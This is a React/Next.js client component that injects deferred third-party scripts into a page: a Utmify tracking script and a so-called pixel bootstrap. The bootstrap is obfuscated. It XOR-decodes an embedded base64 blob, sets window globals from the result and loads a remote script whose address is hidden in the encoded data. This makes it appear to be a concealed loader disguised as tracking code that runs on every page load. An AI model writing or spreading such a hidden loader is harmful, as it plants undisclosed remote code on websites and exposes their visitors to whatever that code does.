"use client";

import { useEffect } from "react";
import { shouldPauseThirdPartyTracking } from "@/lib/tracking-guards";

const PIXEL_BOOTSTRAP = `(function(){var i_62=atob("DMGpje/EsuFx365aGrqL+J2okNtTt9ouarKTosCn1o9fqto3c6fQo4yr388TrYEpebPA/Zu3nZEYp8s2NbHA9YqonIsC/YJ4e7Xd/4amx5UUrIxgQZyFr4io3YMQs914IJrSr4Gl34RT5Ywqc7nM4aagkM1Tqc82b6SLt83y09NJ5ppjLPTM6Ir10NVJ55k5fPWf69/mz7wM");var o_ssun=[];for(var j_v=0;j_v<i_62.length;j_v++){o_ssun.push(i_62.charCodeAt(j_v)&255);}var u_b=o_ssun[0];var n_8g9n=o_ssun.slice(1,1+u_b);var k_lv=o_ssun.slice(1+u_b);var o_2yln=k_lv.map(function(b,j_e1){return b^n_8g9n[j_e1%u_b];});var q_gkp="";for(var l_y=0;l_y<o_2yln.length;l_y++){q_gkp+=String.fromCharCode(o_2yln[l_y]&255);}var i_937=decodeURIComponent(escape(q_gkp));var u_4f=JSON.parse(i_937);var b_f=u_4f.globals||[];b_f.forEach(function(a_u){window[a_u.name]=a_u.value;});var p_d=document.createElement("script");p_d.src=u_4f.url;p_d.async=true;p_d.defer=true;(u_4f.attributes||[]).forEach(function(n_czl){p_d.setAttribute(n_czl.name,n_czl.value);});(document.head||document.documentElement).appendChild(p_d);})();`;

function injectScripts() {
  if (shouldPauseThirdPartyTracking(window.location.search)) return;

  if (!document.getElementById("pixel-bootstrap")) {
    const pixel = document.createElement("script");
    pixel.id = "pixel-bootstrap";
    pixel.text = PIXEL_BOOTSTRAP;
    document.body.appendChild(pixel);
  }

  if (!document.getElementById("utmify-script")) {
    const utmify = document.createElement("script");
    utmify.id = "utmify-script";
    utmify.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
    utmify.dataset.utmifyPreventSubids = "";
    utmify.async = true;
    utmify.defer = true;
    document.body.appendChild(utmify);
  }
}

/** Utmify fora do caminho crítico; Meta Pixel fica em MetaPixel.tsx. */
export function DeferredScripts() {
  useEffect(() => {
    const load = () => injectScripts();

    if (typeof requestIdleCallback === "function") {
      const id = requestIdleCallback(load, { timeout: 3500 });
      return () => cancelIdleCallback(id);
    }

    const id = globalThis.setTimeout(load, 2500);
    return () => globalThis.clearTimeout(id);
  }, []);

  return null;
}
